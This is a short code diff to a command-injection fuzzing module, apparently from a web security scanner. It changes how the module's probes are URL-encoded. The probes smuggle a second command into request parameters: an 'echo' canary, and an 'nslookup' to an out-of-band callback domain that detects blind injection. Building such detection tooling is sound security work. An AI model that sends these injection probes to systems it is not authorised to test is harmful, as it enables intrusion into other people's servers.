@@ -25,9 +25,10 @@ class CmdILightfuzz(BaseLightfuzz):
         for p in cmdi_probe_strings:
             try:
                 echo_probe = f"{probe_value}{p} echo {canary} {p}"
+                # we have to handle our own URL-encoding here, because our payloads include the & character
                 if self.event.data["type"] == "GETPARAM":
                     echo_probe = urllib.parse.quote(echo_probe.encode(), safe="")
-                cmdi_probe = await self.compare_probe(http_compare, self.event.data["type"], echo_probe, cookies)
+                cmdi_probe = await self.compare_probe(http_compare, self.event.data["type"], echo_probe, cookies, skip_urlencoding=True)
                 if cmdi_probe[3]:
                     if canary in cmdi_probe[3].text and "echo" not in cmdi_probe[3].text:
                         self.lightfuzz.debug(f"canary [{canary}] found in response when sending probe [{p}]")
@@ -61,9 +62,9 @@ class CmdILightfuzz(BaseLightfuzz):
                     "probe": p,
                 }
                 interactsh_probe = f"{p} nslookup {subdomain_tag}.{self.lightfuzz.interactsh_domain} {p}"
-
+                # we have to handle our own URL-encoding here, because our payloads include the & character
                 if self.event.data["type"] == "GETPARAM":
                     interactsh_probe = urllib.parse.quote(interactsh_probe.encode(), safe="")
                 await self.standard_probe(
-                    self.event.data["type"], cookies, f"{probe_value}{interactsh_probe}", timeout=15
+                    self.event.data["type"], cookies, f"{probe_value}{interactsh_probe}", timeout=15, skip_urlencoding=True
                 )
